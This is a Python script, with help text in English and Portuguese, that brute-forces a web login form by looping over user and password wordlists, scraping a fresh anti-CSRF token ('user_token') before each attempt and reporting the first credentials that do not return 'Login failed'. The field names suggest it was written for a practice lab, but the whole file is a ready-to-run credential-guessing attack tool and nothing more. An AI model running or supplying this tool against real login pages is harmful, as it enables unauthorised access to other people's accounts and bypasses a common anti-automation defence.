import requests
from bs4 import BeautifulSoup
import argparse
import sys

# Configura argumentos de linha de comando
parser = argparse.ArgumentParser(description='Brute force login with CSRF token support.')
parser.add_argument('-u', '--url', required=True, help='Login page URL | URL da página de login')
parser.add_argument('-U', '--userlist', required=True, help='Path to user wordlist | Caminho para a wordlist de usuários')
parser.add_argument('-w', '--wordlist', required=True, help='Path to password wordlist | Caminho para a wordlist de senhas')
parser.add_argument('-o', '--output', required=False, help='Output file to save the found password (optional) | Arquivo de saída para salvar a senha encontrada (opcional)')
args = parser.parse_args()

url_login = args.url
userlist = args.userlist
wordlist = args.wordlist
output_file = args.output

try:
    with open(userlist, 'r', encoding='latin-1') as users_file:
        usernames = [u.strip() for u in users_file.readlines() if u.strip()]
except FileNotFoundError:
    print(f'[!] Userlist not found: {userlist}')
    sys.exit(1)

try:
    with open(wordlist, 'r', encoding='latin-1') as passwords_file:
        passwords = [p.strip() for p in passwords_file.readlines() if p.strip()]
except FileNotFoundError:
    print(f'[!] Wordlist not found: {wordlist}')
    sys.exit(1)

for username in usernames:
    for password in passwords:
        session = requests.Session()
        login_page = session.get(url_login)
        soup = BeautifulSoup(login_page.text, 'html.parser')

        # Debug opcional
        with open('debug.html', 'w', encoding='utf-8') as debug:
            debug.write(login_page.text)

        token_input = soup.find('input', {'name': 'user_token'})
        if token_input:
            csrf_token = token_input['value']
        else:
            print('[!] CSRF token not found. Check HTML structure')
            sys.exit(1)

        data = {
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': csrf_token
        }

        response = session.post(url_login, data=data)

        if 'Login failed' not in response.text:
            result = f'[+] Password found! User: {username} | Password: {password}'
            print(result)
            if output_file:
                with open(output_file, 'w') as f:
                    f.write(result + '\n')
            sys.exit(0)
        else:
            print(f'[-] Tried: {username}:{password}')

print('[!] No valid credentials found.')
